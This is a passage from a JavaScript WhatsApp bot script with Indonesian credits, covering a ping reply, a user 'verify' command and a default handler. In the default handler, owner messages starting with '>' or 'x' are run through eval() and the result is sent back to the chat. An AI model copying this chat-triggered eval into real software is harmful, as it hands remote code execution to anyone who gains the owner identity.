const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
replyy(pingnya);
});
break;
case 'verify':
const serialUser = createSerial(18)
veri = sender
_registered.push(sender)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const ara = fs.readFileSync('./media/sticker/verify.webp');
Hanz.sendMessage(from, ara, MessageType.sticker, {quoted: mek})
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[BATES]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
default:
if (isOwner) {
	
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return Hanz.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		}
		fin = process.uptime()
        if (!mek.hasNewMessage) return Hanz.setStatus(`Runtime ${runtime(process.uptime())} | prefix ${prefix} | ${asutes}`)
        mek = mek.messages.all()[0]
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}
//SCRIPT BY HANZ々OFC彡
//PRIVATE TEAM
/*TQ TO
GW SENDIRI/HARIS
MOONA SENPAI
RAFFI
WILDAN 
BRUTAL 
SAWALY
PUTRA
PAK TYZ
RAGIL GAY
XFAA Xenpai
MBOH LIANE NUMPANG SC
*/

	
    
